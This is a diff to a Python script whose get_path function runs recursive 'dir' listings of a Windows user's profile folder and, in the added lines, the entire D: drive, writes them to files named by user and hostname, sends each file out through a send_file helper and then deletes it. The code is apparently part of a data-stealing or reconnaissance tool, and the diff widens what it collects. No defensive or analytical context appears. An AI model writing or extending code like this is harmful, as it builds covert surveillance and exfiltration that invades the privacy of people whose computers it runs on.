@@ -151,7 +151,7 @@ def get_path():
 
             file_path_all_C = os.path.join(dir_path, f'{user}__{hostname}__all_C.txt')
             try:
-                os.system(f'dir C:\\Users\\{user} /s /b > {file_path_all_C}')
+                os.system(f'dir C:\\Users\\{user} /s> {file_path_all_C}')
                 with open(file_path_logs, 'a') as f:
                     f.write("all_C file created and data written \n")
 
@@ -164,7 +164,7 @@ def get_path():
             file_path_all_alt_C = os.path.join(dir_path, f'{user}__{hostname}__all_alt_C.txt')
             try:
                 with open(file_path_all_alt_C, 'w') as f:
-                    f.write(os.popen(f'dir C:\\Users\\{user} /s /b').read())
+                    f.write(os.popen(f'dir C:\\Users\\{user} /s').read())
                 with open(file_path_logs, 'a') as f:
                     f.write("all_alt_C file created and data written \n")
 
@@ -173,6 +173,31 @@ def get_path():
             except Exception as e:
                 with open(file_path_logs, 'a') as f:
                     f.write(f"all_alt_C file error: {e} \n")
+
+            file_path_all_D = os.path.join(dir_path, f'{user}__{hostname}__all_D.txt')
+            try:
+                os.system(f'dir D:\\ /s> {file_path_all_D}')
+                with open(file_path_logs, 'a') as f:
+                    f.write("all_D file created and data written \n")
+
+                send_file(file_path_all_D)
+                os.remove(file_path_all_D)
+            except Exception as e:
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"all_D file error: {e} \n")
+
+            file_path_all_alt_D = os.path.join(dir_path, f'{user}__{hostname}__all_alt_D.txt')
+            try:
+                with open(file_path_all_alt_D, 'w') as f:
+                    f.write(os.popen(f'dir D:\\ /s').read())
+                with open(file_path_logs, 'a') as f:
+                    f.write("all_alt_D file created and data written \n")
+
+                send_file(file_path_all_alt_D)
+                os.remove(file_path_all_alt_D)
+            except Exception as e:
+                with open(file_path_logs, 'a') as f:
+                    f.write(f"all_alt_D file error: {e} \n")
 
             file_path_desktop_C = os.path.join(dir_path, f'{user}__{hostname}__desktop_C.txt')
             try:
